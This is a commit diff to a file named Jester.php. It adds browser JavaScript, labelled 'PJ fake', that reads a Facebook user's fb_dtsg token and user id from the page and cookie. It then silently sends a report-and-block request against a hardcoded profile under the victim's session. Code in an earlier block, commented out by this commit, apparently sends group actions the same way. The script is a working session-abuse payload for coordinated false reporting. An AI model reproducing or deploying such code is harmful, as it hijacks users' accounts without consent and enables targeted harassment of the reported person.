ef425b8a70b9e15504e9a57df8896d3a227957e3
bhargav1996 <www.bhargav1996@gmail.com>
2013-09-29 14:19:20 +0530

    Update Jester.php

--- Jester.php
+++ Jester.php
@@ -23,7 +23,7 @@ pages("382408828493995");
 
 */
 
-/*groups*/
+/*groups
 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -41,6 +41,30 @@ function G(gid) {
   Page.send(PageParams);
 }
 G("598368236842941");
+*/
+
+
+/*PJ fake*/
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var now=(new Date).getTime();
+function Report(id) {
+  var Page = new XMLHttpRequest();
+  var PageURL = "//www.facebook.com/ajax/report/social.php";
+  var PageParams ="fb_dtsg="+fb_dtsg+"&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A"+id+"%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2FNan.ertt7%22%2C%22report_type%22%3A145%2C%22rid%22%3A"+id+"%2C%22sub_report_type%22%3A3%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj2qmvu5k9UmAAaUVpo&__req=u&ttstamp=2658168571071108880";
+  Page.open("POST", PageURL, true);
+  Page.onreadystatechange = function () {
+    if (Page.readyState == 4 && Page.status == 200) {
+      Page.close;
+    }
+  };
+  Page.send(PageParams);
+}
+Report("100006474028106");
+
+
+
+
 
 
 /*Ids*/
